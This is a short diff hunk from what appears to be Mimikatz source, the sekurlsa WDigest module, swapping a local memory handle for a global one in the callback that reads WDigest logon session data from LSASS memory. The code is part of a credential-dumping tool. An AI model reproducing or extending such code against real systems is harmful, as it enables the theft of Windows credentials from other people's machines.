@@ -39,8 +39,7 @@ NTSTATUS kuhl_m_sekurlsa_wdigest(int argc, wchar_t * argv[])
 
 void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_wdigest(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
+	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
 	SIZE_T taille;
 	
 	if(kuhl_m_sekurlsa_wdigest_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_wdigest_package.Module, WDigestReferences, ARRAYSIZE(WDigestReferences), (PVOID *) &l_LogSessList, NULL, NULL, &offsetWDigestPrimary))
